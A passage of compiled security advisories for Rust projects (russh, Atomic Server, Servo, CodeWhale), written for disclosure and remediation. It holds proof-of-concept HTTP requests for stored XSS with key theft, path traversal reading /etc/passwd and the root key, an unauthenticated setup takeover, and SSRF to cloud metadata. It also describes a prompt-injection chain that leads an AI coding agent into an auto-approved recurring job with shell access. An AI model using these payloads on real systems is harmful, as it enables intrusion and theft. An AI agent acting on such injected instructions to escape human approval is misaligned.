    let mut listener = tokio::net::UnixListener::bind(&agent_path).unwrap();
    let agent = Refuse(prompts.clone());
    tokio::spawn(async move {
        agent::server::serve(
            Incoming {
                listener: &mut listener,
            },
            agent,
        )
        .await
    });

    let key = decode_secret_key(ED25519_KEY, Some("blabla")).unwrap();
    let public = key.public_key().clone();
    let stream = tokio::net::UnixStream::connect(&agent_path).await.unwrap();
    let mut client = agent::client::AgentClient::connect(stream);
    // What `ssh-add -c` sends.
    client
        .add_identity(&key, &[agent::Constraint::Confirm])
        .await
        .unwrap();

    let signed = client
        .sign_request(&AgentIdentity::from(public), None, b"data".to_vec())
        .await;
    let confirm_calls = prompts.load(Ordering::SeqCst);
    assert!(
        signed.is_err(),
        "the agent signed with a confirm-constrained key without asking: \
         Agent::confirm was called {confirm_calls} time(s)"
    );
    assert_eq!(
        confirm_calls, 1,
        "Agent::confirm should be asked exactly once"
    );
}
```

On v0.64.1 (e5d80a0) the test fails:

```
the agent signed with a confirm-constrained key without asking: Agent::confirm was called 0 time(s)
```

With the fix below it passes, and so do all 46 `keys::` tests.

### Impact

A russh-based agent whose `Agent::confirm` asks the user, or applies any other check, signs every request for a confirm-constrained key without running that check. Anyone who can talk to the agent can then use the key without the user's approval:
- other local processes of the user;
- the remote host, when the agent is forwarded (`ssh -A`).

Preventing exactly this is the purpose of the confirm constraint. RFC 9987 §10 names it as what stops an attacker with access to the agent from "stealing use of those keys".

Because the agent accepts the constraint, `ssh-add -c` reports success and the user believes the key is protected. RFC 9987 §5.2.7 says an agent that does not support a constraint MUST refuse the key instead.

The private key itself is not exposed. The impact is unauthorized use of it for as long as the attacker can reach the agent: logging in to other hosts as the user, or signing data such as git commits.

**Known affected downstream user** (from its public code; not tested): Proton Pass desktop, which uses russh 0.62.7.
- It adds every key with `Constraint::Confirm` ([mod.rs L332](https://github.com/ProtonMail/WebClients/blob/64862561fea883c1b4360b7338a0102eaad5c0fb/applications/pass-desktop/native/napi/src/ssh_agent/mod.rs#L332)).
- It uses `Agent::confirm` as its "Pass is unlocked" check before signing, and defers `MessageType::Sign` from `confirm_request` to it ([L75-L100](https://github.com/ProtonMail/WebClients/blob/64862561fea883c1b4360b7338a0102eaad5c0fb/applications/pass-desktop/native/napi/src/ssh_agent/mod.rs#L75-L100)). That check never runs.
- Proton also removes keys from the agent on lock and logout ([ssh-agent.middleware.ts L23-L27](https://github.com/ProtonMail/WebClients/blob/64862561fea883c1b4360b7338a0102eaad5c0fb/applications/pass/src/app/Store/ssh-agent.middleware.ts#L23-L27)).

So the exposure there is limited to states in which keys stay loaded while Pass is not unlocked. Their own code notes, for example, that the agent persists across renderer reloads and account switches.

### Suggested fix

```diff
--- a/russh/src/keys/agent/server.rs
+++ b/russh/src/keys/agent/server.rs
@@ -346,11 +346,7 @@ impl<S: AsyncRead + AsyncWrite + Send + Unpin + 'static, A: Agent + Send + Sync
             }
         };
         let agent = if needs_confirm {
-            let (agent, ok) = {
-                let _pk = key.clone();
-                Box::new(futures::future::ready((agent, true)))
-            }
-            .await;
+            let (agent, ok) = agent.confirm(key.clone()).await;
             if !ok {
                 return Ok((agent, false));
             }
```

When `confirm` returns `false`, `try_sign` returns `false` and the agent answers `SSH_AGENT_FAILURE`, as it did before the regression.

**Compatibility note for the release notes:** `confirm` is called again for confirm-constrained keys, so implementations that stub it out will now hit that stub.
- For example, Litterbox implements `confirm` as `todo!()` ([agent.rs L81-L87](https://github.com/Gerharddc/Litterbox/blob/c2cc67b80926affecbaa5905a7480af17b1270f2/litterbox/src/agent.rs#L81-L87)).
- Each connection runs in its own task, so such a panic ends only that connection.

**Related but separate:** with the default `confirm`, the agent still accepts the confirm constraint without enforcing it. Given RFC 9987 §5.2.7, refusing such keys when the application does not implement `confirm` may be worth considering.

References:
- https://github.com/Eugeny/russh/security/advisories/GHSA-vp5q-ff62-jwqv [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-116794 [ADVISORY]
- https://github.com/Eugeny/russh/commit/3e04597dc54e36bfc85c21996f7d8d9d224e9826 [WEB]
- https://github.com/Eugeny/russh/commit/62db6e7defd6d244159da962ccccb029e785ce0f [WEB]
- https://github.com/Eugeny/russh [PACKAGE]
- https://github.com/Eugeny/russh/releases/tag/v0.65.0 [WEB]

### GHSA-x277-3wcg-g9r2 — Atomic Server: Stored XSS via uploaded files served inline (same-origin) on `/download` → account takeover
- Aliases: CVE-2026-69155 | Published: 2026-11-18 | Modified: 2026-11-18 | Severity: HIGH
- CWE: CWE-79
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N`
- Affected crates.io/atomic-server: introduced:0.30.0 last_affected:0.40.1

## Summary

Files uploaded via `POST /upload` are served back by `GET /download/{path}` using `actix_files::NamedFile`. For `text/html` and `image/svg+xml`, actix-files (0.6.6) sets `Content-Disposition: inline`, so the browser **renders** the file instead of downloading it. The `/download` route sets **no `Content-Security-Policy`, no `X-Content-Type-Options: nosniff`, and no forced `attachment`** (CSP exists only on the SPA route), and files are served from the **same origin** as the app UI. An authenticated Agent uploads `evil.html` containing `<script>`; when a victim opens the link, the script executes in the app origin. Because the `atomic_session` cookie is set via `document.cookie` (not HttpOnly) and the Agent's Ed25519 private key is stored in same-origin IndexedDB (`browser/data-browser/src/helpers/agentStorage.ts`), the script exfiltrates the private key → **permanent account takeover**.

## Affected component

- `server/src/handlers/upload.rs` — stores the file; mimetype guessed from extension.
- `server/src/handlers/download.rs:65` — `NamedFile::open(...).into_response(req)` with no CSP/nosniff/attachment; CSP is only set in `server/src/handlers/single_page_app.rs`.

## Steps to Reproduce

Environment: `joepmeneer/atomic-server:develop`, `http://localhost:9883`. Attacker is any Agent with write on a folder.

1. Upload an HTML file (multipart, with signed auth headers):

```http
POST /upload?parent=http://localhost:9883 HTTP/1.1
Host: localhost:9883
x-atomic-public-key: <pubkey>
x-atomic-agent: http://localhost:9883/agents/<pubkey>
x-atomic-timestamp: <ms>
x-atomic-signature: <ed25519("http://localhost:9883/upload?parent=http://localhost:9883 <ms>")>
Content-Type: multipart/form-data; boundary=----poc

------poc
Content-Disposition: form-data; name="assets"; filename="xss.html"
Content-Type: text/html

<html><body><script>alert(document.domain)</script>STORED-XSS-PROOF</body></html>
------poc--
```

Response `200` returns a `downloadURL`, e.g. `http://localhost:9883/download/files/<ts>-xss.html`.

2. Inspect how the server serves it:

```
$ curl -D - http://localhost:9883/download/files/<ts>-xss.html
HTTP/1.1 200 OK
content-type: text/html; charset=utf-8
content-disposition: inline; filename="<ts>-xss.html"
# (no Content-Security-Policy, no X-Content-Type-Options)
```

`text/html` + `inline` + no CSP/nosniff + same origin → the browser executes the uploaded HTML/JS in the app origin. `image/svg+xml` behaves identically.

3. The attacker sends the link to a victim. On open, the script runs same-origin and reads `document.cookie` (session is not HttpOnly) and the Ed25519 private key from IndexedDB → signs Commits as the victim indefinitely.

**Expected:** user files served with `Content-Disposition: attachment` + `nosniff`, or from an isolated origin.
**Actual:** served `inline`, `text/html`, same origin, no CSP/nosniff → stored XSS executes.

*(Confirmed at the HTTP layer in the lab: content-type, disposition, missing CSP/nosniff, same origin, and the intact `<script>` body. In-browser execution and IndexedDB key theft follow directly from these response headers.)*

## Impact

Stored XSS in the app origin → theft of the victim's session cookie (not HttpOnly) and Ed25519 private key from IndexedDB → permanent account takeover (not limited by the 10-second token window). If the victim is an admin/root Agent, this is server takeover.

## Remediation

- On `/download`, force `Content-Disposition: attachment` for user files, add `X-Content-Type-Options: nosniff`, and a `sandbox` CSP.
- Serve user-uploaded files from a separate origin/subdomain.
- Set `HttpOnly` + `Secure` on the session cookie; do not persist the private key in JS-readable storage.

References:
- https://github.com/ontola/atomic-server/security/advisories/GHSA-x277-3wcg-g9r2 [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-69155 [ADVISORY]
- https://github.com/ontola/atomic-server/commit/457c1dc9af4cd00d2aec89720718e504a49f392d [WEB]
- https://github.com/ontola/atomic-server/commit/8a8badfd3099765e62ccf6f92dc78a408a11106f [WEB]
- https://github.com/ontola/atomic-server [PACKAGE]
- https://github.com/ontola/atomic-server/releases/tag/v0.40.3 [WEB]

### GHSA-8vc4-8hjq-988p — Atomic Server: Arbitrary file read via user-controlled `internalId` in the `/download` handler (leaks root agent private key)
- Aliases: CVE-2026-69156 | Published: 2026-11-18 | Modified: 2026-11-18 | Severity: HIGH
- CWE: CWE-22
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`
- Affected crates.io/atomic-server: introduced:0.30.0 last_affected:0.40.1

## Summary

The Commit apply path enforces **no allowlist of writable properties**, so any authenticated Agent can set the `internalId` string (datatype `string`, no character validation) on a resource it owns. The `/download` handler then uses that value **verbatim** as a filesystem path — `file_path.push(internal_id); NamedFile::open(file_path)` — with **no sanitization and no containment check** (`server/src/handlers/download.rs:56-65`). By setting `internalId` to a traversal path (`../../../../etc/passwd`) or an absolute path (`PathBuf::push` of an absolute path replaces the buffer), an attacker reads **any file on the host**. The highest-value target is the server config file storing the **root agent private key**, which yields full server compromise. Only the *upload* path sanitizes filenames (`sanitize_filename`); the *download* path trusts the stored value. The handler also never checks that the resource is a `File`.

## Affected component

- `server/src/handlers/download.rs:56-65` — `file_path.push(internal_id)` + `NamedFile::open`, no sanitization, no `File`-class check.
- `lib/src/commit.rs` (`apply_changes`) — sets any property; no server-managed-property denylist.

## Steps to Reproduce

Environment: `joepmeneer/atomic-server:develop`, `http://localhost:9883`. Attacker is any Agent with write on a parent (self-signup, or via the `/setup` issue reported separately).

1. Create a resource and set `internalId` to a traversal path — sign the Commit and `POST /commit` (200):

```
subject = http://localhost:9883/pwnfile
set = {
  "https://atomicdata.dev/properties/parent": "http://localhost:9883",
  "https://atomicdata.dev/properties/internalId": "../../../../../../../../etc/passwd"
}
```

2. Download it. The auth signature is over the **resolved subject** (the server strips the `/download` prefix → `http://localhost:9883/pwnfile`):

```http
GET /download/pwnfile HTTP/1.1
Host: localhost:9883
x-atomic-public-key: <pubkey>
x-atomic-agent: http://localhost:9883/agents/<pubkey>
x-atomic-timestamp: <ms>
x-atomic-signature: <ed25519("http://localhost:9883/pwnfile <ms>")>
```

Response `200 OK` returns the host `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
...
```

3. Escalate — set `internalId = /atomic-storage/config/config.toml` (absolute path) and download again:

```toml
server      = "http://localhost:9883"
agent       = "http://localhost:9883/agents/+/KwsAmyzc7S/..."
private_key = "REDACTED-ROOT-ED25519-PRIVATE-KEY"   # server root agent key
```

4. Using the stolen key, the attacker signs a Commit with `signer = <root agent>` → `POST /commit` (200) edits data **as root**. Full compromise.

**Expected:** `internalId` treated as a server-managed property and/or `/download` canonicalizes and confines the path to `uploads_path`.
**Actual:** Arbitrary host file read, including the root private key.

## Impact

Arbitrary file read as the server process: `/etc/passwd`, env, TLS keys, the sled DB, K8s service-account tokens, and the **root agent private key** → root impersonation → full read/write/delete of all data. Only a standard account is needed.

## Remediation

- In `download.rs`: `sanitize_filename(internal_id)`, then `canonicalize` and assert the resolved path stays within `uploads_path` before opening; verify the resource is a `File`.
- Add a server-managed-property denylist (`internalId`, rights arrays, etc.) in `lib/src/commit.rs` so clients cannot set them.

References:
- https://github.com/ontola/atomic-server/security/advisories/GHSA-8vc4-8hjq-988p [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-69156 [ADVISORY]
- https://github.com/ontola/atomic-server/commit/59d067c797c946b839c9101fedff4c40171c0c61 [WEB]
- https://github.com/ontola/atomic-server [PACKAGE]
- https://github.com/ontola/atomic-server/releases/tag/v0.40.3 [WEB]

### GHSA-pfwx-xjp4-qxcj — Atomic Server: Unauthenticated `/setup` invite grants write access to the entire Drive
- Aliases: CVE-2026-69157 | Published: 2026-11-18 | Modified: 2026-11-18 | Severity: CRITICAL
- CWE: CWE-306
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- Affected crates.io/atomic-server: introduced:0.29.0 last_affected:0.40.1

## Summary

atomic-server provisions a well-known invite at `{server}/setup` with `write = true`, `target` = the Drive root, and `usagesLeft = 1`. Invite redemption **ignores the redeemer's identity** (`for_agent: _` in `server/src/plugins/invite.rs:22`), so possession of the URL is the only requirement. An **unauthenticated** attacker who sends `GET /setup?public-key=<attacker_key>` has the server create a new Agent and grant it **write access to the entire Drive**. On a freshly deployed (not-yet-claimed) instance this is a full server takeover with no credentials.

## Severity

**Critical — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8).** No authentication required; grants attacker-controlled write over all resources in the Drive.

## Affected component

- `server/src/appstate.rs` — creates the `/setup` invite targeting the Drive root with `write=true`, `usagesLeft=1`.
- `server/src/plugins/invite.rs:14-173` — `construct_invite_redirect` destructures `for_agent: _` (redeemer identity discarded); `?public-key=` → `Agent::new_from_public_key` → `add_rights(agent, target, write=true)`.

## Steps to Reproduce

Environment: `joepmeneer/atomic-server:develop` in Docker, `http://localhost:9883`, fresh store. No auth headers are used.

1. Confirm the invite is live — `GET /setup` (Accept: `application/ad+json`) shows `invite/write = true`, `invite/target = http://localhost:9883` (Drive root), `usagesLeft = 1`.

2. Redeem it anonymously with an attacker-generated ed25519 public key:

```http
GET /setup?public-key=q2UkizMX0Go4mHwW2BXepqkzpP5FHlagEft8M32t0EM%3D HTTP/1.1
Host: localhost:9883
Accept: application/ad+json
```

Response `200 OK` returns a `Redirect` confirming the new agent:

```json
{
  "https://atomicdata.dev/properties/invite/redirectAgent":
      "http://localhost:9883/agents/q2UkizMX0Go4mHwW2BXepqkzpP5FHlagEft8M32t0EM=",
  "https://atomicdata.dev/properties/isA": ["https://atomicdata.dev/classes/Redirect"]
}
```

3. `GET /` shows the attacker is now in the Drive's `write` array:

```json
"https://atomicdata.dev/properties/write": [
  "http://localhost:9883/agents/+/KwsAmyzc7S/...",                        // legit root
  "http://localhost:9883/agents/q2UkizMX0Go4mHwW2BXepqkzpP5FHlagEft8M32t0EM="  // ATTACKER
]
```

4. The attacker signs a normal Commit (ed25519 over the JCS-canonical commit) and `POST /commit` (200) — the Drive root was successfully edited. Write access proven.

**Expected:** `/setup` must require operator authentication / a one-time secret.
**Actual:** Any unauthenticated client on the network redeems it and gains Drive-wide write.

## Impact

Unauthenticated write to the entire Drive: read/modify/delete any resource, create/alter Agents, reconfigure permissions. This is a complete takeover on a fresh deployment. (It also serves as the entry point of a larger chain: with write access, an attacker can read the server root private key and impersonate root — reported separately.)

## Remediation

- Require a one-time secret (printed to stdout at startup) or operator authentication to redeem `/setup`.
- Invalidate `/setup` after first use with an **atomic** `usagesLeft` decrement (sled transaction) — the current read-check-decrement is a TOCTOU that allows a single-use invite to be redeemed multiple times concurrently.
- Fix the inverted invite-expiry check in `invite.rs` (`if expires > now { reject }` is backwards, so expired invites remain redeemable and valid ones are rejected).

References:
- https://github.com/ontola/atomic-server/security/advisories/GHSA-pfwx-xjp4-qxcj [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-69157 [ADVISORY]
- https://github.com/ontola/atomic-server/commit/98517d8921c78bd9b728a2459378c184ebf8a969 [WEB]
- https://github.com/ontola/atomic-server [PACKAGE]

### GHSA-ff87-73jp-f3v4 — Atomic Server: Unauthenticated full-response SSRF in Atomic-Server /bookmark endpoint
- Aliases: CVE-2026-69158 | Published: 2026-11-18 | Modified: 2026-11-18 | Severity: HIGH
- CWE: CWE-918
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`
- Affected crates.io/atomic-server: introduced:0 last_affected:0.40.1

## Summary

Atomic-Server exposes a `GET /bookmark` endpoint that fetches an attacker-supplied URL server-side, parses the response, and reflects the fetched content back to the caller. The endpoint requires no authentication and performs no authorization of its own, and the underlying fetch helper applies no allow-list or private-IP deny-list. An unauthenticated attacker with network reach to the server can force it to issue arbitrary outbound HTTP GET requests to internal-only hosts (loopback services, internal admin panels, link-local cloud-metadata) and read the response body back. This is a full-response SSRF, not a blind one.

## Root cause (source trace)

1. The bookmark endpoint is registered unconditionally for every server: `server/src/appstate.rs:69` (`store.add_endpoint(plugins::bookmark::bookmark_endpoint())`).
2. An unauthenticated caller on the standard GET route becomes `ForAgent::Public`: `server/src/helpers.rs:168-183` (`get_client_agent`).
3. In `get_resource_extended`, when the subject matches an endpoint path the function returns via `call_endpoint` BEFORE the `hierarchy::check_read` authorization call: `lib/src/db.rs:1010-1017` (`if is_endpoint { return self.call_endpoint(...) }`, and `check_read` sits just after at :1017, never reached).
4. `call_endpoint` performs no authorization itself; it only matches the path and invokes the handler: `lib/src/db.rs:662-706`.
5. The bookmark handler discards the caller (`for_agent: _`) and fetches the `url` query parameter directly: `server/src/plugins/bookmark.rs:45-76` (`let content = fetch_data(&path)?;`).
6. `fetch_body` validates only `url.starts_with("http")`: `lib/src/client/helpers.rs:78-91`. A repo-wide grep finds no `is_loopback` / `is_private` / `127.0.0.1` / `169.254` / `localhost` deny-list anywhere in `lib/src` or `server/src`, and no host allow-list.
7. The fetched body is HTML-parsed and written into the resource `name`, `description`, `image` and `preview` (markdown) fields, which are returned to the caller: `server/src/plugins/bookmark.rs:79-110`. This is what makes it a full-response (not blind) SSRF; even plaintext internal responses are wrapped into the preview markdown.

## Proof of concept (unauthenticated)

```
GET /bookmark?url=http://127.0.0.1:<internal-port>/&name=x        # internal loopback service
GET /bookmark?url=http://169.254.169.254/latest/meta-data/&name=x # IMDSv1 cloud metadata
```

No authentication headers. The returned resource reflects the fetched content in its `name` / `description` / `preview` fields, so the attacker reads the internal target's response body.

## Proof of omission

The endpoint-dispatch path returns at `lib/src/db.rs:1011` (`return self.call_endpoint(...)`) before the `check_read` call at `:1017`, and there is no authorization inside `call_endpoint` (`:662-706`). The handler discards the caller (`for_agent: _`, `bookmark.rs:49`), so the endpoint can never enforce per-agent access. `fetch_body` validates only `url.starts_with("http")` (`helpers.rs:83`); no loopback/private/link-local deny-list exists anywhere in the source. No corresponding SSRF/security entry exists in CHANGELOG.md.

## Impact

An unauthenticated attacker with network reach to the server can:
- read internal-only HTTP services not exposed to the internet (admin panels, dashboards, unauthenticated microservices on loopback or the private network);
- read cloud metadata reachable via plain GET (IMDSv1 and similar), enabling potential credential disclosure in affected deployments;
- enumerate internal services / ports from the server's vantage point via differing timeout/error behaviour.

Because the response body is reflected, this is a high-value full-response SSRF. The only precondition is network reach to the server.

Severity: High, CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N = 8.6.

Honest caveats (do not refute the finding): the `ureq` client uses a 2-second timeout, which limits slow targets; AWS IMDSv2 requires a PUT token, so plain GET metadata retrieval may fail there. IMDSv1 and any internal HTTP service or admin panel that answers a plain GET remain fully reachable and reflected.

## Remediation

Add a central SSRF guard inside `fetch_body` (`lib/src/client/helpers.rs`): resolve the target host and reject loopback, link-local, RFC1918 private, CGNAT and unique-local ranges, and reject non-http(s) schemes. Re-validate after DNS resolution (to prevent DNS-rebinding) and after each redirect hop. Enforce authorization on endpoint dispatch: run `check_read` (or a per-endpoint policy) for outbound-fetching endpoints instead of short-circuiting before it at `lib/src/db.rs:1010-1012`, and at minimum require an authenticated, authorized agent for `/bookmark`. Optionally add an operator-configurable allow-list of fetchable hosts.

## Dedup

- atomicdata-dev/atomic-server GitHub Security Advisories: no published advisories (re-verified 2026-07-03). No CVE/GHSA for atomic-server SSRF / the /bookmark endpoint.
- Source re-verified on current `develop` 2026-07-03: the handler still discards the caller (`for_agent: _`) and calls `fetch_data(url)`, and `fetch_body` still validates only `url.starts_with("http")` with no private-IP deny-list (still vulnerable).

## Credit / disclosure

Reported by Ray Sabee, Whitehat Security (https://whitehatsecurity.nl/), GitHub @raysabee. Please credit "Ray Sabee / Whitehat Security / whitehatsecurity.nl" on the advisory and in any release notes. Coordinated disclosure: nothing will be published before a fix is available.

Note: two related findings exist in the same repo and can be handled in this advisory or alongside it: F-ATOMIC-SSRF-002 (a blind pre-auth SSRF in `POST /import` via the SAME `fetch_body` root cause, so one central fix covers both) and F-ATOMIC-LFI-001 (authenticated path-traversal file read in `GET /download`, a separate sink in `download.rs`).

References:
- https://github.com/ontola/atomic-server/security/advisories/GHSA-ff87-73jp-f3v4 [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-69158 [ADVISORY]
- https://github.com/ontola/atomic-server/commit/006ff290f7ec976c8cbafdceb7b6899389abd5be [WEB]
- https://github.com/ontola/atomic-server/commit/2d4535fcd84761288027616505cc61abdf05bc50 [WEB]
- https://github.com/ontola/atomic-server/commit/e7f551d385045708240ca56889d1334a39349735 [WEB]
- https://github.com/ontola/atomic-server [PACKAGE]
- https://github.com/ontola/atomic-server/releases/tag/v0.40.3 [WEB]

### GHSA-pxh3-4qqv-58mg — Servo Sandbox bypass: declarative refresh can auto-navigate a sandboxed iframe
- Aliases: CVE-2026-61713 | Published: 2026-11-19 | Modified: 2026-11-19 | Severity: HIGH
- CWE: CWE-693
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L`
- Affected crates.io/servo: introduced:0 fixed:0.3.0

A sandboxed iframe can auto-navigate itself via declarative refresh even when automatic features should be blocked. This allows attacker-controlled embedded content to redirect itself without user action.

### Summary
Servo allows a sandboxed iframe to auto-navigate itself via declarative refresh in configurations that should block automatic features.

The issue reproduces in the must-block rows of the matrix:

- `sandbox=""`
- `sandbox="allow-same-origin"`
- `sandbox="allow-forms"`
- `sandbox="allow-same-origin allow-forms"`

This is a client-side sandbox-policy bypass. It does not by itself prove script execution or parent DOM access, but it does let attacker-controlled sandboxed content redirect itself without user action.

### Details
The declarative refresh path is missing sandbox enforcement:

- [components/script/dom/document/document.rs:239] `RefreshRedirectDue::invoke()` contains `TODO: check sandbox`
- [components/script/dom/document/document.rs:4522] the refresh scheduler contains `TODO: handle active sandboxing flag`

The implementation currently schedules and executes the refresh without enforcing the sandboxed automatic-features restriction described by the HTML spec comments in the same code.

What I observed:

- In Servo, the must-block rows above navigated successfully.
- In Chrome, the same rows were blocked.

### PoC
Serve the HTML files in this folder over HTTP.

Files:
- [child.html](https://github.com/user-attachments/files/27770907/child.html)
- [success.html](https://github.com/user-attachments/files/27770910/success.html)
- [viewer.html](https://github.com/user-attachments/files/27770911/viewer.html)

Steps:

1. Open `viewer.html` over HTTP.
2. The page shows a visible sandboxed iframe.
3. In a correct browser, the iframe stays on `child.html`.
4. In Servo, the iframe visibly turns into the `success.html` page.

### Impact
This is a client-side sandbox-policy bypass.

Confirmed impact:

- autonomous iframe self-navigation in sandbox configurations that should block it
- framed phishing / content swap after initial render
- redirect loops / annoyance / limited DoS

References:
- https://github.com/servo/servo/security/advisories/GHSA-pxh3-4qqv-58mg [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-61713 [ADVISORY]
- https://github.com/servo/servo/pull/45116 [WEB]
- https://github.com/servo/servo/commit/70df09e72f40fab45493ffee3821e7a1a31ae4d2 [WEB]
- https://github.com/servo/servo [PACKAGE]
- https://github.com/servo/servo/releases/tag/v0.3.0 [WEB]

### GHSA-8hp3-xxrg-v9c8 — CodeWhale: Automation auto_approve defaults to true, bypassing the task-path hardening fix for silent recurring agent execution
- Aliases: CVE-2026-83817 | Published: 2026-11-19 | Modified: 2026-11-19 | Severity: HIGH
- CWE: CWE-1188, CWE-862
- CVSS_V3: `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H`
- Affected crates.io/codewhale-tui: introduced:0 fixed:0.9.0
- Affected npm/codewhale: introduced:0 fixed:0.9.0

### Maintainer resolution

The CodeWhale maintainers validated this report. CodeWhale 0.8.67 and earlier are affected. Version 0.9.0 contains the fix in commit 208421b9d23d81cea3311a1eeb2a2ea81d637686. Users should upgrade to 0.9.0 or later. The original reporter analysis is preserved below.

## Summary
CVE-2026-45374 (GHSA-72w5-pf8h-xfp4) hardened the task path so auto-approval must be opted into explicitly: `add_task` uses `req.auto_approve.unwrap_or(false)` (task_manager.rs:868). The automation subsystem was not hardened in kind. `AutomationRecord::task_auto_approve()` resolves an omitted `auto_approve` to `DEFAULT_AUTOMATION_AUTO_APPROVE = true` (automation_manager.rs:29, 101-103), and `enqueue_run_task` builds the `NewTaskRequest` with `auto_approve: Some(automation.task_auto_approve())` — i.e. an explicit `Some(true)` (automation_manager.rs:766). Because the field is `Some`, `unwrap_or(false)` returns `true` and the seed-2 default is bypassed. That `true` propagates to `ApprovalMode::Bypass` (runtime_threads.rs:2253), where the background approval loop auto-approves every tool call with no human present (runtime_threads.rs:3383-3416). One approved `automation_create` becomes a durable, recurring, fully auto-approved agent. Same insecure-default class as CVE-2026-45374, on a different, unpatched subsystem.

## Root Cause
Sibling durable defaults in the same struct are safe — `DEFAULT_AUTOMATION_ALLOW_SHELL = false` and `DEFAULT_AUTOMATION_TRUST_MODE = false` (automation_manager.rs:27-28) — while `DEFAULT_AUTOMATION_AUTO_APPROVE` alone defaults `true` (:29). `create_automation` stores `auto_approve: None` when omitted (:422); `task_auto_approve()` resolves `None`→`true` (:101-103); `enqueue_run_task` passes `Some(true)` (:766), defeating `add_task`'s `unwrap_or(false)` seed fix. The `automation_create` tool schema also declares `"auto_approve": {"type":"boolean","default":true}` (tools/automation.rs:49) while sibling `allow_shell`/`trust_mode` default `false`.

## Impact
A single approved `automation_create` yields a durable, recurring, fully auto-approved agent. Every scheduled fire silently authorizes mutating tools (file writes, apply_patch, git, MCP writes) with no prompt; combined with `allow_shell:true` in the create call, recurring silent RCE with no human present. Even without `allow_shell`, every recurring run silently authorizes all non-shell mutating tools. Same class as seed CVE-2026-45374.

## Proof of Concept
Prompt injection convinces the model to create a benign-sounding recurring job (single human approval on the `automation_create` call):
```json
{"name":"automation_create","arguments":{
  "name":"nightly-maintenance",
  "prompt":"Fetch latest and run project setup script",
  "rrule":"FREQ=HOURLY;INTERVAL=1",
  "allow_shell":true
}}
```
(`auto_approve` omitted → stored `None` → resolves to `true` on every run.)

## Attack Chain
1. **Entry.** Prompt injection → model creates a recurring job via `automation_create` with `auto_approve` omitted.
   - **Guard:** `automation_create` is `Required` (tools/automation.rs:61-63) — user sees ONE approval prompt.
   - **Bypass proof:** the prompt describes an innocuous automation; the schema hides `"auto_approve": {"default": true}` (tools/automation.rs:49). Approving "create a scheduled job" is not informed consent to "every future run bypasses all approval prompts." The resolved `auto_approve=true` (omitted field) is not surfaced.
2. **Persist.** `create_automation` stores `auto_approve: None` (automation_manager.rs:422).
   - **Guard:** none.
   - **Bypass proof:** `None` is later resolved to `true`, not `false`.
3. **Fire.** Headless scheduler tick (`scheduler_tick_shared`, no human) or `automation_run` invokes `enqueue_run_task`, which sets `auto_approve: Some(true)` (automation_manager.rs:766).
   - **Guard:** seed-2's hardened `add_task` default `unwrap_or(false)` (task_manager.rs:868).
   - **Bypass proof:** the value is `Some(true)`, so `unwrap_or(false)` yields `true` — the hardened default never applies.
4. **Sink.** Background worker builds the turn with `auto_approve=true` → `ApprovalMode::Bypass` (runtime_threads.rs:2253); the approval loop auto-approves (runtime_threads.rs:3383-3416).
   - **Guard:** auto_review safety_floor.
   - **Bypass proof:** safety_floor holds only `Publish` (any origin) and `Destructive/Secret` (background/headless) (auto_review.rs:344-357); ordinary `write_file`/`apply_patch`/`edit_file`/non-destructive `exec_shell` are NOT held → they run unattended. With `allow_shell:true`, every scheduled run additionally gets silent shell execution.
5. **Impact.** Durable, recurring, fully auto-approved agent from one create approval; recurring silent RCE with `allow_shell:true`.

## Bypass Evidence
- Present on latest release tag v0.8.67: automation_manager.rs:27-29 (`ALLOW_SHELL=false`, `TRUST_MODE=false`, `AUTO_APPROVE=true`), :101-103 `task_auto_approve()`→`unwrap_or(true)`, :766 `Some(automation.task_auto_approve())`, :422 stores `None` when omitted; task_manager.rs:868 `unwrap_or(false)`; runtime_threads.rs:2253 `if auto_approve → ApprovalMode::Bypass`. automation_manager.rs and task_manager.rs byte-identical v0.8.67↔HEAD.
- Subsystem wired by default: `automation_create`/`automation_run` registered via `with_runtime_task_tools()` in `with_agent_tools_policy` (registry.rs:1005); TUI attaches `automations: Some(...)` (tui/ui.rs:986-1011), serve mode via runtime_api.rs:426 — not feature-gated.
- Sibling flags `allow_shell`/`trust_mode` default `false` in the same struct — `auto_approve=true` is the un-hardened anomaly.

## Affected Versions
`<= 0.8.67` (present on latest release tag v0.8.67 and HEAD 6a3403e).

## Suggested Fix
Set `DEFAULT_AUTOMATION_AUTO_APPROVE = false` (mirror the seed-2 task-path fix) and change the `automation_create` schema default to `false`, so durable automations require explicit opt-in to auto-approval just like the task path.

Reported by **zx (Jace)**

References:
- https://github.com/codewhale-hq/Codewhale/security/advisories/GHSA-8hp3-xxrg-v9c8 [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-83817 [ADVISORY]
- https://github.com/codewhale-hq/Codewhale/commit/208421b9d23d81cea3311a1eeb2a2ea81d637686 [WEB]
- https://github.com/codewhale-hq/Codewhale [PACKAGE]
- https://github.com/codewhale-hq/Codewhale/releases/tag/v0.9.0 [WEB]

### GHSA-3mgh-93r5-r7jf — CodeWhale: exec_shell parallel-readonly classifier auto-approves fd/rg/git grep exec flags enabling silent RCE
- Aliases: CVE-2026-83816 | Published: 2026-11-19 | Modified: 2026-11-19 | Severity: HIGH
- CWE: CWE-78, CWE-863
- CVSS_V3: `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`
- Affected crates.io/codewhale-tui: introduced:0 fixed:0.9.0
